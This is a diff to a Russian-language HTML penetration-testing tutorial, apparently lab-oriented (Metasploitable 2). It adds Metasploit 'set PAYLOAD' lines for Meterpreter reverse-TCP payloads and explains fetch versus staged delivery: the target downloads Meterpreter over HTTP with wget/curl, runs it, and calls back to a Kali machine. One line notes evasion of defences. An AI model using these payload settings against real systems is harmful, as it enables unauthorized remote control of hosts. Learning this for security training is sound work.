@@ -368,6 +368,14 @@ set PAYLOAD cmd/linux/http/x86/meterpreter_reverse_tcp
 </p>
 
 <p>
+Или еще можно использовать аналогичный payload (будет работать так же):
+</p>
+
+<p>
+set PAYLOAD cmd/linux/http/x86/meterpreter/reverse_tcp
+</p>
+
+<p>
 cmd/linux/http/x86/meterpreter_reverse_tcp является универсальным payload'ом для 32-битных Linux, эксплойт позволяет выполнить команду и целевая система может скачать файл по HTTP. Именно поэтому его так часто используют в учебных лабораториях вроде Metasploitable 2.
 </p>
 
@@ -412,7 +420,7 @@ cmd/linux/http/x86/meterpreter_reverse_tcp
 </p>
 
 <p>
-5)Скачанный файл — это стейдж Meterpreter (не полноценный эксплойт, а исполняемый модуль Meterpreter).
+5)Скачанный файл — это готовый исполняемый модуль Meterpreter.
 </p>
 
 <p>
@@ -740,6 +748,189 @@ Affected versions:
 В реальном пентесте так и делают: сначала определяют версию приложения и анализируют возможные уязвимости, а затем проверяют один или несколько наиболее подходящих эксплойтов, пока не найдут тот, который действительно работает.
 </p>
 
+
+<p>
+Какая разница между:
+</p>
+
+<p>
+set PAYLOAD cmd/linux/http/x86/meterpreter_reverse_tcp  
+</p>
+
+<p>
+set PAYLOAD cmd/linux/http/x86/meterpreter/reverse_tcp
+</p>
+
+<p>
+Разница есть, и она важная.
+</p>
+
+
+<p>
+Мы сравниваем два разных payload'а:
+</p>
+
+<p>
+cmd/linux/http/x86/meterpreter_reverse_tcp
+</p>
+
+<p>
+и
+</p>
+
+<p>
+cmd/linux/http/x86/meterpreter/reverse_tcp
+</p>
+
+<p>
+На первый взгляд отличаются только символом /, но внутри Metasploit это разные семейства payload'ов.
+</p>
+
+<p>
+cmd/linux/http/x86/meterpreter_reverse_tcp
+</p>
+
+<p>
+Это современный payload (Fetch Payload).
+</p>
+
+<p>
+Он:
+</p>
+
+<p>
+выполняет одну команду на удаленной машине;
+<br>
+скачивает Meterpreter по HTTP;
+<br>
+запускает его;
+<br>
+устанавливает обратное соединение.
+</p>
+
+<p>
+Именно его сейчас рекомендует Metasploit для Linux.
+</p>
+
+<p>
+cmd/linux/http/x86/meterpreter/reverse_tcp
+</p>
+
+<p>
+Это старый (staged) payload.
+</p>
+
+<p>
+Раньше Meterpreter строился по схеме:
+</p>
+
+<p>
+stager — маленькая первая часть;
+</p>
+
+<p>
+stage — основная часть Meterpreter.
+</p>
+
+<p>
+Сначала запускался небольшой загрузчик, а затем через сеть догружался остальной Meterpreter.
+</p>
+
+<p>
+Почему сейчас чаще используют первый?
+</p>
+
+<p>
+Потому что новый payload:
+</p>
+
+<p>
+cmd/linux/http/x86/meterpreter_reverse_tcp
+</p>
+
+<p>
+работает надежнее:
+</p>
+
+<p>
+не зависит от механизма stage/stager;
+<br>
+проще проходит через современные средства защиты;
+<br>
+является рекомендуемым вариантом в новых версиях Metasploit.
+</p>
+
+<p>
+То есть главное различие:
+</p>
+
+<p>
+старый payload → скачивается (или выполняется) stager, который затем догружает stage - то есть сам meterpreter;
+</p>
+
+<p>
+новый Fetch Payload → сразу скачивается готовый исполняемый файл Meterpreter, который после запуска сам устанавливает соединение. Никакого отдельного stage уже нет.
+</p>
+
+<p>
+В старом staged payload происходит так:
+</p>
+
+<pre>
+
+Эксплойт
+    ↓
+На удаленной машине запускается маленький stager
+    ↓
+Stager подключается к Kali
+    ↓
+Kali передает основной Meterpreter (stage)
+    ↓
+Stage загружается в память
+    ↓
+Получаем meterpreter >
+
+</pre>
+
+<p>
+То есть:
+</p>
+
+<p>
+stager — это маленькая программа (или небольшой кусок кода), задача которой — только установить соединение с Metasploit и запросить следующую часть. stage — это и есть основной Meterpreter, содержащий его функциональность (команды sysinfo, shell, upload, download и т.д.).
+</p>
+
+<p>
+Поэтому можно сказать:
+</p>
+
+<p>
+stage — это основной код Meterpreter.
+</p>
+
+<p>
+Именно поэтому такой payload называется staged — он загружается поэтапно (stage за stage).
+</p>
+
+<p>
+В новом Fetch Payload (cmd/linux/http/x86/meterpreter_reverse_tcp) всё проще:
+</p>
+
+<pre>
+
+Эксплойт
+    ↓
+на удаленной машине wget/curl скачивает готовый файл Meterpreter
+    ↓
+Файл запускается
+    ↓
+Он сразу подключается к Kali
+
+</pre>
+
+<p>
+То есть весь Meterpreter уже находится в скачанном исполняемом файле. Отдельно догружать stage уже не нужно.
+</p>
 
 </body>
 </html>
